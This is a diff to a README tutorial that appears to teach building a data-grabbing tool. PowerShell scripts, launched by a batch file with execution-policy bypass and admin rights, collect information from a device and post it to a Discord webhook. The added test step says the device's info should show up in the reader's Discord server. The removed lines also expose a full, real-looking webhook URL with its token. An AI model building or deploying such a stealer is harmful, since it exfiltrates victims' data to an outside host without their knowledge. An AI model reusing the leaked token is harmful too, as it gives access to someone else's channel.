@@ -16,9 +16,10 @@ Prerequisites:
 ## Now we want to setup our first powershell file.
 1. Create a empty .ps1 file using either Notepad++, VSCode, or any other IDS of your choice.
 2. Paste the following code into it and save it out.
+3. Make sure you replace the "webhookUrl" to your discord channel's webhook link.
 ```powershell
 # Define Discord webhook URL
-$webhookUrl = "https://discord.com/YOUR_DISCORD_WEBHOOK"
+$webhookUrl = "https://discord.com/YOUR_DISCORD_WEBHOOK_LINK"
 
 # Function to send a message to Discord webhook
 function Send-DiscordWebhook {
@@ -246,6 +247,7 @@ foreach ($msg in $messages) {
 ## Now it's time to setup our second powershell file.
 1. Create another empty .ps1 file.
 2. Paste the following code into it and save it out.
+3. Make sure you replace the "webhookUrl" to your discord channel's webhook link.
 ```powershell
 # Run PowerShell as Administrator for this script to work
 
@@ -283,7 +285,7 @@ function Send-ToDiscord {
     param (
         [string]$message
     )
-    $webhookUrl = "https://discord.com/api/webhooks/1265363802812186676/K6uFVQG_nbJF6bK3-WrVK-fY-D9Yd1LCNex64X8a9KyxquWgQcsZ5U6Kh9csHlS_nmjE"
+    $webhookUrl = "https://discord.com/api/webhooks/YOUR_DISCORD_WEBHOOK_LINK"
     $payload = @{
         content = $message
     }
@@ -328,3 +330,14 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%scriptDir%%scriptName2%"
 :: End the batch file
 exit
 ```
+
+# Step 5:
+## Testing time!
+1. Your project directory should look something like this <br>
+![](https://i.imgur.com/dLHUWE9.png)
+2. Go ahead and run the batch file on a test device.
+3. All the info on the test device should be showing up in your discord server now.
+![](https://i.imgur.com/oVW2NQp.png)
+![](https://i.imgur.com/N2DNV6L.png)
+![](https://i.imgur.com/SfJjrA7.png)
+![](https://i.imgur.com/FAXCWaG.png)
